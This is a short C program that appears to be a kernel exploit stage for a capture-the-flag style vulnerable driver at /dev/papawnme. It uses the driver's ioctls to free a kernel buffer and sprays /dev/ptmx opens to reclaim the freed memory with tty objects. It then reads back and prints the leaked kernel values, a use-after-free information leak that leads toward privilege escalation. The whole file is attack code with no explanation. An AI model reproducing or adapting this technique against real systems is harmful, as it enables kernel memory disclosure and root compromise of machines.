#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>

struct param{
    size_t idx;
    size_t size;
    char *buf;
} ;


int spray[0x200];

int main(){
	struct param heap;
	int fd = open("/dev/papawnme", O_RDWR);
	heap.idx = 0;
	heap.size = 0x30;
	heap.buf = malloc(0x30);
	memset(heap.buf, 'A', 0x28);
	ioctl(fd, 0x1770, (unsigned long)&heap); // malloc
	free(heap.buf);
	heap.size = 0x90;
	heap.buf = malloc(0x90);

	for (int i = 0; i < 0x100; i++) {
                spray[i] = open("/dev/ptmx", O_NOCTTY | O_RDONLY);
        }
	ioctl(fd, 0x1771, (unsigned long)&heap); // kfree
	ioctl(fd, 0x1772, (unsigned long)&heap);// get value?
	for(int i = 16; i < 0x100; i+=8){
               printf("idx %d w val 0x%llx\n", i, *(long long *) (heap.buf+i));
        }
}



